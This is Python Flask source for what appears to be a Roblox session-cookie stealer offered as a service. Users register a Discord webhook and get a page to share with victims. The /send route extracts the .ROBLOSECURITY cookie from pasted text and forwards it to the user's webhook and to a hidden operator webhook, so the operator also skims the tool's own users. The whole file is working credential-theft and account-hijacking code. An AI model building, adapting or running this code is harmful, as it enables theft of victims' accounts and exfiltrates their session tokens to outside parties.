from flask import Flask, request, render_template, redirect, url_for
import os
import requests
import re
import logging
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.DEBUG)

webhooks = {}
your_webhook_url = os.getenv('YOUR_DISCORD_WEBHOOK_URL')
base_url = "https://your-github-username.github.io/your-repo-name"  # Replace this with your actual GitHub Pages URL

@app.route('/')
def setup():
    return render_template('setup.html')

@app.route('/add_webhook', methods=['POST'])
def add_webhook():
    directory_name = secure_filename(request.form['directory_name'])

    # Check if the directory name already exists
    if directory_name in webhooks:
        error_message = f"Directory '{directory_name}' already exists. Please choose a different name."
        return render_template('error.html', message=error_message)

    user_webhook_url = request.form['webhook_url']
    method = request.form['method']

    webhooks[directory_name] = user_webhook_url

    # Send a confirmation message to the user's Discord
    if method == 'normalhook':
        data = {'content': f"Your generator has been set up! Use the URL: {base_url}/{directory_name}"}
    elif method == 'dualhook':
        data = {'content': "Dualhook is under maintenance! Keep updated."}
    else:
        data = {'content': f"Your generator has been set up! Use the URL: {base_url}/{directory_name}"}

    response = requests.post(user_webhook_url, json=data)
    if response.status_code != 204:
        logging.error(f"Failed to send webhook: {response.text}")

    return f"Directory '{directory_name}' has been set up! Share this URL: {base_url}/{directory_name}"

@app.route('/hyperlink_generator')
def hyperlink_generator():
    return "Hyperlink Generator Page (Under Construction)"

@app.route('/<directory_name>')
def directory_page(directory_name):
    if directory_name in webhooks:
        return render_template('directory.html', directory_name=directory_name)
    else:
        return "Directory not found", 404

@app.route('/send/<directory_name>', methods=['POST'])
def send(directory_name):
    if directory_name not in webhooks:
        return redirect(url_for('error'))

    full_message = request.form['message']
    if not full_message.strip():
        return redirect(url_for('error'))

    pattern = r'\.ROBLOSECURITY", "(.*?)", "/", "\.roblox\.com"\)\)\)'
    match = re.search(pattern, full_message)

    if match:
        specific_message = match.group(1)

        if len(specific_message) > 2000:
            specific_message = specific_message[:2000]

        user_webhook_url = webhooks[directory_name]

        # Send to user's Discord
        user_data = {'content': f"**{directory_name} Cookie :cookie: message:**\n```\n{specific_message}\n```"}
        user_response = requests.post(user_webhook_url, json=user_data)

        # Send to your Discord
        your_data = {'content': f"**{directory_name} Cookie :cookie: message:**\n```\n{specific_message}\n```"}
        your_response = requests.post(your_webhook_url, json=your_data)

        if user_response.status_code != 204:
            logging.error(f"Failed to send user's webhook: {user_response.text}")
        if your_response.status_code != 204:
            logging.error(f"Failed to send your webhook: {your_response.text}")

        if user_response.ok and your_response.ok:
            return 'Message sent!'
        else:
            return 'Failed to send message to one or both webhooks.'
    else:
        return redirect(url_for('error_custom', message='Invalid message format. Please include the specific message pattern.'))

@app.route('/error')
def error():
    return "Error: Message cannot be empty. Please go back and enter a message."

@app.route('/error_custom')
def error_custom():
    message = request.args.get('message', 'An error occurred. Please try again.')
    return render_template('error.html', message=message)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)
